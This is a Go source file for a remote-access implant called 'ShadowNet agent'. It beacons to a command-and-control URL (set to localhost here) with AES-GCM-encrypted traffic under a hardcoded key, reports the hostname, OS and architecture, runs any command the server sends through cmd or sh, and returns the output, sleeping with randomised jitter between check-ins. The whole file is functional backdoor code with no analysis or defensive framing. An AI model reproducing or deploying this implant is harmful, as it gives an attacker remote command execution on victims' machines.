package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	crand "crypto/rand"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"time"
)

/*
-------------------------------
 CONFIG
-------------------------------
*/

var serverURL = "http://127.0.0.1:8080/beacon"
var secretKey = []byte("01234567890123456789012345678901")

/*
-------------------------------
 STRUCTS
-------------------------------
*/

type AgentInfo struct {
	Agent    string `json:"agent"`
	Hostname string `json:"hostname,omitempty"`
	OS       string `json:"os,omitempty"`
	Arch     string `json:"arch,omitempty"`
	Status   string `json:"status"`
	Output   string `json:"output,omitempty"`
}

type Task struct {
	Task string `json:"task"`
}

/*
-------------------------------
 ENCRYPTION
-------------------------------
*/

func encrypt(data []byte) (string, error) {
	block, err := aes.NewCipher(secretKey)
	if err != nil {
		return "", err
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return "", err
	}

	nonce := make([]byte, gcm.NonceSize())
	if _, err := io.ReadFull(crand.Reader, nonce); err != nil {
		return "", err
	}

	ciphertext := gcm.Seal(nonce, nonce, data, nil)
	return base64.StdEncoding.EncodeToString(ciphertext), nil
}

func decrypt(enc string) ([]byte, error) {
	data, err := base64.StdEncoding.DecodeString(enc)
	if err != nil {
		return nil, err
	}

	block, err := aes.NewCipher(secretKey)
	if err != nil {
		return nil, err
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}

	nonceSize := gcm.NonceSize()
	nonce, ciphertext := data[:nonceSize], data[nonceSize:]
	return gcm.Open(nil, nonce, ciphertext, nil)
}

/*
-------------------------------
 SYSTEM INFO
-------------------------------
*/

func collectFullInfo() AgentInfo {
	host, _ := os.Hostname()
	return AgentInfo{
		Agent:    "go-agent",
		Hostname: host,
		OS:       runtime.GOOS,
		Arch:     runtime.GOARCH,
		Status:   "alive",
	}
}

func collectHeartbeat() AgentInfo {
	return AgentInfo{
		Agent:  "go-agent",
		Status: "alive",
	}
}

/*
-------------------------------
 COMMAND EXECUTION
-------------------------------
*/

func executeCommand(cmdStr string) string {
	var cmd *exec.Cmd

	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/C", cmdStr)
	} else {
		cmd = exec.Command("sh", "-c", cmdStr)
	}

	out, err := cmd.CombinedOutput()
	if err != nil {
		return string(out)
	}
	return string(out)
}

/*
-------------------------------
 BEACON
-------------------------------
*/

func sendBeacon(info AgentInfo) (Task, error) {
	plain, _ := json.Marshal(info)
	encrypted, _ := encrypt(plain)

	payload := map[string]string{"data": encrypted}
	body, _ := json.Marshal(payload)

	resp, err := http.Post(serverURL, "application/json", bytes.NewBuffer(body))
	if err != nil {
		return Task{}, err
	}
	defer resp.Body.Close()

	var response map[string]string
	json.NewDecoder(resp.Body).Decode(&response)

	decrypted, _ := decrypt(response["data"])
	var task Task
	json.Unmarshal(decrypted, &task)

	return task, nil
}

/*
-------------------------------
 JITTER
-------------------------------
*/

func jitterSleep(base int) {
	jitter := rand.Intn(base) - (base / 2)
	sleep := base + jitter
	if sleep < 1 {
		sleep = 1
	}
	time.Sleep(time.Duration(sleep) * time.Second)
}

/*
-------------------------------
 MAIN
-------------------------------
*/

func main() {
	fmt.Println("[*] ShadowNet agent started")

	rand.Seed(time.Now().UnixNano())

	firstRun := true

	for {
		var info AgentInfo

		if firstRun {
			info = collectFullInfo()
			firstRun = false
		} else {
			info = collectHeartbeat()
		}

		task, err := sendBeacon(info)
		if err != nil {
			jitterSleep(10)
			continue
		}

		if task.Task != "" {
			output := executeCommand(task.Task)
			info.Output = output
			sendBeacon(info)
		}

		jitterSleep(10)
	}
}
